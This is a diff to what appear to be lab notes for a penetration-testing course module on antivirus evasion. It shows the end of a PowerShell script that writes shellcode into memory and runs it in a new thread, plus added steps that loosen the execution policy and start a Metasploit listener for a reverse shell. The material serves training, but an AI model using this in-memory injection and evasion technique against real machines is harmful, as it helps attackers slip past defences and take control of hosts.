@@ -68,7 +68,9 @@ for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i
 $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 ```
 
-We then need to adjust our pe
+We then need to adjust our Execution Policy to ensure we have the ability to run the script. We can check our permissions and adjust via `Get-ExecutionPolicy -Scope CurrentUser` and `Set-ExecutionPolicy Unrestricted -Scope CurrentUser` commands.
+
+Once the policies are adjusted we can start MSFConsole and setup a listener using the "multi/handler" module.
 
 
 **3.  Attempt to get a reverse shell using a PowerShell one-liner rather than a script.[1](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/antivirus-evasion/bypassing-antivirus-detection/practice-powershell-in-memory-injection#fn1)**
